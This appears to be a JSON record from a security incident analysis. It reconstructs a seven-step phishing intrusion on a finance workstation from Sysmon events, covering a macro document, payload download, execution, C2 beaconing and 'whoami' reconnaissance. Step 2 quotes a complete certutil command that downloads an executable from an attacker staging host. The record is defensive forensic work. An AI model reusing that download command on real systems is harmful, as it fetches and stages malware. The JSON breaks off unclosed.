{
  "severity": "high",
  "network_observations": [
    {"ip": "10.30.6.84", "inferred_role": "finance_user_workstation", "first_seen": "2027-04-18T01:08:11+0200", "last_seen": "2027-04-18T01:14:08+0200", "agent_name": "WS-FINANCE-07"},
    {"ip": "185.220.101.91", "inferred_role": "external_c2_endpoint", "first_seen": "2027-04-18T01:09:52+0200", "last_seen": "2027-04-18T01:11:18+0200"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Initial Access / Phishing", "technique": "T1566.001", "what_happened": "At 2027-04-18 01:08:11 CEST, Sysmon Event 1 fired on WS-FINANCE-07 (10.30.6.84): outlook.exe spawned winword.exe opening 'Q1_Report.docm' (macro-enabled document). User CORP\\hafiz.r (finance department user). The .docm extension + outlook.exe parent = classic phishing-attachment-with-macro initial access vector.", "chain_reason": "Sysmon Event 1: parentImage=outlook.exe, image=winword.exe, commandLine references Q1_Report.docm. The user is in the finance department — high-value target for invoice/business-email-compromise themed phishing campaigns.", "first_seen": "2027-04-18T01:08:11+0200"},
    {"step": 2, "tactic": "Execution / LOLBin Download", "technique": "T1105 + T1218.005", "what_happened": "At 01:09:42 CEST (~91 seconds after Word opened the macro doc), Sysmon Event 1 fired: 'cmd.exe /c certutil -urlcache -split -f http://staging.malsrv.tk/p.exe %TEMP%\\upd_4921.exe' with parentImage=winword.exe, user=CORP\\hafiz.r. certutil.exe is a Living-Off-the-Land binary (LOLBin) — Windows-signed utility being abused to download an EXE payload over HTTP. The .tk free TLD + IP-likely-not-corporate-CDN destination are strong attacker indicators. The 91-second delay between doc-open and macro-trigger is typical of auto-running macro on document open.", "chain_reason": "Sysmon Event 1: image=cmd.exe with commandLine containing 'certutil -urlcache -split -f' (canonical LOLBin download syntax) + parentImage=winword.exe (Office app spawning cmd.exe = ASR-Office-Child-Process anti-pattern). The download target staging.malsrv.tk uses the .tk free TLD often abused for short-lived staging infrastructure.", "first_seen": "2027-04-18T01:09:42+0200"},
    {"step": 3, "tactic": "Defense Evasion / Unsigned Binary Drop", "technique": "T1036.005 + T1574.002", "what_happened": "At 01:09:44 CEST, Sysmon Event 11 (FileCreate) fired: targetFilename=C:\\Users\\hafiz\\AppData\\Local\\Temp\\upd_4921.exe, signed=false, SHA256=f8a4c9d2b1e8a7f3c5d6b9a8e7f0c1d2b3e4f5a6c7b8d9e0f1a2b3c4d5e6f7a8. An UNSIGNED executable was just dropped to the per-user %TEMP% directory via certutil — a high-fidelity malware-staging signature. The file name 'upd_4921.exe' mimics an update-related file but has no Microsoft / vendor signature.", "chain_reason": "Sysmon Event 11: targetFilename matches *\\AppData\\Local\\Temp\\*.exe pattern; signed=false; hash is novel (no prior occurrence in baseline). %TEMP%-EXE drops by Office-spawned processes are universally suspicious.", "first_seen": "2027-04-18T01:09:44+0200"},
    {"step": 4, "tactic": "Execution / User-Mode Payload Launch", "technique": "T1204.002 + T1059", "what_happened": "At 01:09:45 CEST (1 second after the drop), Sysmon Event 1 fired: image=C:\\Users\\hafiz\\AppData\\Local\\Temp\\upd_4921.exe, parentImage=winword.exe, integrityLevel=Medium, user=CORP\\hafiz.r. The macro launched the just-dropped unsigned EXE under Medium integrity (= normal user privileges, no UAC elevation). Within 4 seconds the malware loop has completed: phishing doc → macro → certutil download → Temp drop → launch.", "chain_reason": "Sysmon Event 1: image points at the freshly-dropped Temp path; parentImage=winword.exe directly (no cmd.exe intermediate) means Word's macro VBA called ShellExecute on the payload; integrityLevel=Medium confirms no UAC bypass attempt; user matches the phishing victim's identity. The 1-second gap between Event 11 file create and Event 1 process create is diagnostic of drop-and-execute pattern.", "first_seen": "2027-04-18T01:09:45+0200"},
    {"step": 5, "tactic": "Command & Control / TLS Egress", "technique": "T1071.001", "what_happened": "At 01:09:52 CEST (7 seconds after launch), Sysmon Event 3 (Network) fired: image=C:\\Users\\hafiz\\AppData\\Local\\Temp\\upd_4921.exe, data.dest_ip=185.220.101.91, dest_port=443, protocol=TCP/TLS. The freshly-executed Temp binary opened a TLS session to a public external IP. Combined with chain step 2's HTTP staging download, the chain is two-server: a low-value staging.malsrv.tk staging server for the initial download, and a separate higher-value 185.220.101.91 C2 endpoint for ongoing command/control. This is the textbook staged-loader-then-C2 pattern.", "chain_reason": "Sysmon Event 3 with image pointing at the Temp-path binary + data.dest_ip on a public IP = freshly-dropped malware beaconing to external C2. Port 443 + TLS chosen to blend with legitimate HTTPS traffic and evade simple deep-packet-inspection.", "first_seen": "2027-04-18T01:09:52+0200"},
    {"step": 6, "tactic": "Command & Control / DNS Resolution", "technique": "T1071.004 + T1568", "what_happened": "At 01:11:18 CEST, Sysmon Event 22 (DNS Query) fired: image=C:\\Users\\hafiz\\AppData\\Local\\Temp\\upd_4921.exe, queryName=c2-stage.malsrv.tk. The malware is resolving a SECOND .tk subdomain (different from the staging.malsrv.tk used for initial download) — suggests staged C2 infrastructure with separate stage-1 / stage-2 domains. The 'c2-stage' DGA-like subdomain naming is operator-friendly for tracking infection cohorts.", "chain_reason": "Sysmon Event 22: image still points at the Temp-path malware; queryName uses the same parent .tk free TLD as the staging download (malsrv.tk). Same attacker infrastructure operator across two phases of the attack.", "first_seen": "2027-04-18T01:11:18+0200"},
    {"step": 7, "tactic": "Discovery / Reconnaissance via Implant", "technique": "T1033 + T1059.003", "what_happened": "At 01:14:08 CEST (~4 minutes after first C2 contact), Sysmon Event 1 fired: 'cmd.exe /c whoami' with parentImage=C:\\Users\\hafiz\\AppData\\Local\\Temp\\upd_4921.exe, user=CORP\\hafiz.r. The implant has received its first interactive command from the C2 operator and is performing identity-orientation reconnaissance (which-user-am-I) — typical post-C2-handshake first command in most C2 frameworks (Cobalt Strike beacon, Sliver implant, Mythic agent, etc.).", "chain_reason": "Sysmon Event 1: image=cmd.exe + commandLine='whoami' + parentImage=upd_4921.exe (the implant itself spawning cmd) = operator-driven reconnaissance via the implant. The 4-minute gap between C2 first contact and the first command is consistent with operator-in-the-loop targeting (a human attacker received the beacon and decided to engage).", "first_seen": "2027-04-18T01:14:08+0200"}
  ],
  "time_window": {"start": "2027-04-18T01:08:11+0200", "end": "2027-04-18T01:14:08+0200"},
